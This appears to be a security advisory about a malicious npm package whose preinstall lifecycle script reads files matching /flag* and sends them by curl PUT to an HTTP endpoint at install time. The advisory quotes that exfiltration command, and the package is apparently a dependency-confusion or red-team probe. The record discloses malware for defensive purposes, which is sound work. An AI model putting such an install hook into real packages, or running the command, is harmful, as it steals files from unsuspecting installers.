summary: preinstall script exfiltrates /flag* filesystem contents to HTTP endpoint
details: The package's preinstall lifecycle script in package.json executes `FLAG=$(cat /flag*); curl -X PUT -H "Content-Type: application/json" -d... http://127.0.0.1:3000/api/modules/ECT-987654`, automatically reading any file matching /flag* on the installer's filesystem and PUTing the contents to an HTTP endpoint at install time. The package ships no library code; its description is `Probe` and the name/version pattern (`ect-839201@100.0.6` with a sibling `payload_839201.json` referencing version 100.0.5) is consistent with a dependency-confusion or red-team probe. Installing the package causes unconditional filesystem read + network exfiltration on `npm install` without any user action.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
